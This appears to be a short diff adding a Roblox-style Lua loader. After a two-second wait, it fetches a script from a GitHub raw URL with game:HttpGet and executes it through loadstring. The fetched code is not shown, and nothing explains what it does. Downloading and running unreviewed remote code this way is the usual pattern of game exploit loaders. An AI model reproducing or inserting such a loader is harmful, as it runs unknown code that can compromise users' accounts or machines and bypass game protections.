@@ -1,0 +1,2 @@
+wait(2)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Nomic-Programming/my-scrip/refs/heads/main/sfas",true))()
